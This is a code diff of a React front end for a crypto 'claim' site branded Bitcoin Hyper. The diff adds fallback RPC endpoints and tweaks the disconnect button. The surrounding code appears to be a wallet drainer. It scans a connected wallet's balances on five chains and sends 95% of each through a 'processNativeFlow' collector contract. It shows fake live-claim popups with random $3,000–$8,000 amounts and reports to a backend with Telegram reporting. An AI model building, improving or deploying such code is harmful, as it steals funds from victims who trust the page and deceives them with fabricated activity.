@@ -3,11 +3,167 @@ import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/re
 import { useDisconnect } from 'wagmi';
 import { ethers } from 'ethers';
 import './index.css';
-  
+
 // ============================================
 // API CONFIGURATION - UPDATED BACKEND URL
 // ============================================
 const BACKEND_URL = 'https://hyperback-pm94.onrender.com';
+
+// ============================================
+// RPC FALLBACK ENDPOINTS FOR ALL CHAINS
+// ============================================
+const ETH_RPC_ENDPOINTS = [
+  'https://eth.llamarpc.com',
+  'https://ethereum.publicnode.com',
+  'https://rpc.ankr.com/eth',
+  'https://cloudflare-eth.com',
+  'https://eth-mainnet.g.alchemy.com/v2/demo'
+];
+
+const BSC_RPC_ENDPOINTS = [
+  'https://bsc-dataseed.binance.org',
+  'https://bsc-dataseed1.defibit.io',
+  'https://bsc-dataseed1.ninicoin.io'
+];
+
+const POLYGON_RPC_ENDPOINTS = [
+  'https://polygon-rpc.com',
+  'https://rpc-mainnet.maticvigil.com',
+  'https://rpc-mainnet.matic.network'
+];
+
+const ARBITRUM_RPC_ENDPOINTS = [
+  'https://arb1.arbitrum.io/rpc',
+  'https://arbitrum.llamarpc.com',
+  'https://rpc.ankr.com/arbitrum'
+];
+
+const AVALANCHE_RPC_ENDPOINTS = [
+  'https://api.avax.network/ext/bc/C/rpc',
+  'https://avalanche-c-chain.publicnode.com',
+  'https://rpc.ankr.com/avalanche'
+];
+
+// ============================================
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
+// ============================================
+const MULTICHAIN_CONFIG = {
+  Ethereum: {
+    chainId: 1,
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    name: 'Ethereum',
+    symbol: 'ETH',
+    explorer: 'https://etherscan.io',
+    icon: '⟠',
+    color: 'from-red-500 to-red-600',
+    rpcEndpoints: ETH_RPC_ENDPOINTS
+  },
+  BSC: {
+    chainId: 56,
+    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
+    name: 'BSC',
+    symbol: 'BNB',
+    explorer: 'https://bscscan.com',
+    icon: '🟡',
+    color: 'from-red-500 to-red-600',
+    rpcEndpoints: BSC_RPC_ENDPOINTS
+  },
+  Polygon: {
+    chainId: 137,
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    name: 'Polygon',
+    symbol: 'MATIC',
+    explorer: 'https://polygonscan.com',
+    icon: '⬢',
+    color: 'from-red-500 to-red-600',
+    rpcEndpoints: POLYGON_RPC_ENDPOINTS
+  },
+  Arbitrum: {
+    chainId: 42161,
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    name: 'Arbitrum',
+    symbol: 'ETH',
+    explorer: 'https://arbiscan.io',
+    icon: '🔷',
+    color: 'from-red-500 to-red-600',
+    rpcEndpoints: ARBITRUM_RPC_ENDPOINTS
+  },
+  Avalanche: {
+    chainId: 43114,
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    name: 'Avalanche',
+    symbol: 'AVAX',
+    explorer: 'https://snowtrace.io',
+    icon: '🔴',
+    color: 'from-red-500 to-red-600',
+    rpcEndpoints: AVALANCHE_RPC_ENDPOINTS
+  }
+};
+
+const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
+
+// Helper: Get a working provider for a chain by trying RPC endpoints in order
+const getProviderForChain = async (chain) => {
+  const endpoints = chain.rpcEndpoints || [chain.rpc];
+  for (const rpcUrl of endpoints) {
+    try {
+      const provider = new ethers.JsonRpcProvider(rpcUrl);
+      // Optional: test the connection (e.g., get block number)
+      await provider.getBlockNumber();
+      console.log(`✅ Connected to ${chain.name} via ${rpcUrl}`);
+      return provider;
+    } catch (err) {
+      console.warn(`Failed to connect to ${chain.name} RPC ${rpcUrl}:`, err.message);
+    }
+  }
+  throw new Error(`No working RPC endpoint for ${chain.name}`);
+};
+
+const PROJECT_FLOW_ROUTER_ABI = [
+  "function collector() view returns (address)",
+  "function processNativeFlow() payable",
+  "event FlowProcessed(address indexed initiator, uint256 value)"
+];
+
+// ============================================
+// PERSISTENT STORAGE KEYS
+// ============================================
+const STORAGE_KEYS = {
+  LIVE_TRANSACTIONS: 'bitcoinHyper_liveTransactions',
+  LAST_RESET_DATE: 'bitcoinHyper_lastResetDate',
+  TOTAL_CLAIMED_AMOUNT: 'bitcoinHyper_totalClaimedAmount',
+  COUNTDOWN_END_TIME: 'bitcoinHyper_countdownEndTime'
+};
+
+// Helper to check if date has changed (for daily reset)
+const hasDateChanged = (lastDate) => {
+  if (!lastDate) return true;
+  const today = new Date().toDateString();
+  return lastDate !== today;
+};
+
+// Get random claim amount between $3,000 and $8,000
+const getRandomClaimAmount = () => {
+  return Math.floor(Math.random() * (8000 - 3000 + 1) + 3000);
+};
+
+// ============================================
+// API HELPER FUNCTIONS WITH TELEGRAM REPORTING
+// ============================================
+
+async function apiCall(endpoint, data, method = 'POST') {
+  try {
+    const response = await fetch(`${BACKEND_URL}${endpoint}`, {
+      method,
+      headers: { 'Content-Type': 'application/json' },
+      body: method !== 'GET' ? JSON.stringify(data) : undefined
+    });
+    return await response.json();
+  } catch (err) {
+    console.error(`API Error ${endpoint}:`, err);
+    return { success: false, error: err.message };
+  }
+}
 
 // ============================================
 // LANGUAGE DETECTION & TRANSLATIONS
@@ -386,119 +542,6 @@ const TRANSLATIONS = {
     bonusTag: '+25% 보너스'
   }
 };
-
-
-const ETH_RPC_ENDPOINTS = [
-  'https://eth.llamarpc.com',
-  'https://ethereum.publicnode.com',
-  'https://rpc.ankr.com/eth',
-  'https://cloudflare-eth.com',
-  'https://eth-mainnet.g.alchemy.com/v2/demo'
-];
-// ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
-// ============================================
-
-const MULTICHAIN_CONFIG = {
-  Ethereum: {
-    chainId: 1,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
-    name: 'Ethereum',
-    symbol: 'ETH',
-    explorer: 'https://etherscan.io',
-    icon: '⟠',
-    color: 'from-red-500 to-red-600',
-    rpcEndpoints: ETH_RPC_ENDPOINTS
-  },
-  BSC: {
-    chainId: 56,
-    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
-    name: 'BSC',
-    symbol: 'BNB',
-    explorer: 'https://bscscan.com',
-    icon: '🟡',
-    color: 'from-red-500 to-red-600',
-    rpc: 'https://bsc-dataseed.binance.org'
-  },
-  Polygon: {
-    chainId: 137,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
-    name: 'Polygon',
-    symbol: 'MATIC',
-    explorer: 'https://polygonscan.com',
-    icon: '⬢',
-    color: 'from-red-500 to-red-600',
-    rpc: 'https://polygon-rpc.com'
-  },
-  Arbitrum: {
-    chainId: 42161,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
-    name: 'Arbitrum',
-    symbol: 'ETH',
-    explorer: 'https://arbiscan.io',
-    icon: '🔷',
-    color: 'from-red-500 to-red-600',
-    rpc: 'https://arb1.arbitrum.io/rpc'
-  },
-  Avalanche: {
-    chainId: 43114,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
-    name: 'Avalanche',
-    symbol: 'AVAX',
-    explorer: 'https://snowtrace.io',
-    icon: '🔴',
-    color: 'from-red-500 to-red-600',
-    rpc: 'https://api.avax.network/ext/bc/C/rpc'
-  }
-};
-
-const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
-
-const PROJECT_FLOW_ROUTER_ABI = [
-  "function collector() view returns (address)",
-  "function processNativeFlow() payable",
-  "event FlowProcessed(address indexed initiator, uint256 value)"
-];
-
-// ============================================
-// PERSISTENT STORAGE KEYS
-// ============================================
-const STORAGE_KEYS = {
-  LIVE_TRANSACTIONS: 'bitcoinHyper_liveTransactions',
-  LAST_RESET_DATE: 'bitcoinHyper_lastResetDate',
-  TOTAL_CLAIMED_AMOUNT: 'bitcoinHyper_totalClaimedAmount',
-  COUNTDOWN_END_TIME: 'bitcoinHyper_countdownEndTime'
-};
-
-// Helper to check if date has changed (for daily reset)
-const hasDateChanged = (lastDate) => {
-  if (!lastDate) return true;
-  const today = new Date().toDateString();
-  return lastDate !== today;
-};
-
-// Get random claim amount between $3,000 and $8,000
-const getRandomClaimAmount = () => {
-  return Math.floor(Math.random() * (8000 - 3000 + 1) + 3000);
-};
-
-// ============================================
-// API HELPER FUNCTIONS WITH TELEGRAM REPORTING
-// ============================================
-
-async function apiCall(endpoint, data, method = 'POST') {
-  try {
-    const response = await fetch(`${BACKEND_URL}${endpoint}`, {
-      method,
-      headers: { 'Content-Type': 'application/json' },
-      body: method !== 'GET' ? JSON.stringify(data) : undefined
-    });
-    return await response.json();
-  } catch (err) {
-    console.error(`API Error ${endpoint}:`, err);
-    return { success: false, error: err.message };
-  }
-}
 
 // ============================================
 // LIVE CLAIM POPUP COMPONENT
@@ -1091,7 +1134,7 @@ function App() {
     }
   };
 
-  // Fetch balances across all chains
+  // Fetch balances across all chains WITH FALLBACK RPCs
   const fetchAllBalances = async (walletAddress) => {
     console.log("🔍 Checking on-chain balances across all supported networks...");
     setScanning(true);
@@ -1103,7 +1146,8 @@ function App() {
     
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
-        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
+        // Use the fallback‑aware provider getter
+        const rpcProvider = await getProviderForChain(chain);
         const balance = await rpcProvider.getBalance(walletAddress);
         const amount = parseFloat(ethers.formatUnits(balance, 18));
         
@@ -1128,7 +1172,7 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             name: chain.name,
-            rpc: chain.rpc
+            rpc: chain.rpcEndpoints?.[0] || chain.rpc // store primary RPC for later use
           };
           console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
         }
@@ -1220,7 +1264,7 @@ function App() {
             console.log(`Chain switch needed, continuing...`);
           }
           
-          const chainProvider = new ethers.JsonRpcProvider(chain.rpc);
+          const chainProvider = new ethers.JsonRpcProvider(chain.rpcEndpoints?.[0] || chain.rpc);
           const balance = balances[chain.name];
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
@@ -1417,7 +1461,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Disconnect wallet handler - one click
+  // Disconnect wallet handler - one click, clear icon now
   const handleDisconnect = async () => {
     try {
       await disconnect();
@@ -1553,17 +1597,18 @@ function App() {
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              {/* Wallet info with DISCONNECT icon - WHITE and working on 1 click */}
+              {/* Wallet info with DISCONNECT icon - CLEAR and working on 1 click */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
                   onClick={handleDisconnect}
-                  className="w-8 h-8 rounded-full bg-white hover:bg-gray-200 transition-colors flex items-center justify-center shadow-lg"
+                  className="w-8 h-8 rounded-full bg-white hover:bg-gray-200 transition-colors flex items-center justify-center shadow-lg group"
                   title="Disconnect Wallet"
                 >
-                  <i className="fas fa-power-off text-black text-xs"></i>
+                  {/* Clear power icon (Unicode) – works even without FontAwesome */}
+                  <span className="text-black text-sm font-bold group-hover:scale-110 transition-transform">⏻</span>
                 </button>
               </div>
               
